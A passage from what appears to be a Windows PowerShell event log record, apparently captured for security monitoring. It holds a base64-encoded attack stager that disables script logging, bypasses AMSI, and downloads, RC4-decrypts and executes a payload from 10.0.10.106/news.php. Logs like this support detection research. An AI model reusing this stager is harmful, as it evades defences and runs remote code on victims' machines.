YQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n        Engine Version = 5.1.17763.316\n        Runspace ID = af4eb08f-cf11-45ec-bcd4-8f4fd11c1776\n        Pipeline ID = 1\n        Command Name = Start-Sleep\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 69927\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","type":"wineventlog","process_id":5172,"task":"Executing Pipeline"}
